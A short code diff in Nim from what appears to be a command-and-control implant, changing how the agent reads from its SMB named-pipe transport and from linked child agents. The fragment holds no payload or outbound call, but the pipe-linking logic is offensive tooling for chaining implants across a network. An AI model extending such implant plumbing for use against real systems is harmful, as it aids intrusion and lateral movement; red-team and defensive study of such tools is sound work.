@@ -46,25 +46,27 @@ proc pipeRead*(hPipe: HANDLE): seq[byte] =
                 return @[]
         dwTotal += dwBytesRead
 
-proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string = 
+proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string =
     var dwSize: DWORD = 0
 
     if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
         when defined(TRANSPORT_SMB):
-            ctx.registered = false
-            DisconnectNamedPipe(ctx.transport.hPipe)
-            CloseHandle(ctx.transport.hPipe)
-            ctx.transport.hPipe = 0
+            if hPipe == ctx.transport.hPipe:
+                ctx.registered = false
+                DisconnectNamedPipe(ctx.transport.hPipe)
+                CloseHandle(ctx.transport.hPipe)
+                ctx.transport.hPipe = 0
         return ""
 
     when defined(TRANSPORT_SMB):
-        # SMB transport agent: block and read the full framed message
-        return Bytes.toString(hPipe.pipeRead())
-    else:
-        # Parent agent polling linked child: non-blocking, only read if data available
-        if dwSize == 0:
-            return ""
-        return Bytes.toString(hPipe.pipeRead())
+        # Poll own transport pipe
+        if hPipe == ctx.transport.hPipe:
+            return Bytes.toString(hPipe.pipeRead())
+
+    # Parent agent polling linked child pipe regardless of transport type
+    if dwSize == 0:
+        return ""
+    return Bytes.toString(hPipe.pipeRead())
 
 # Agent linking
 proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =   
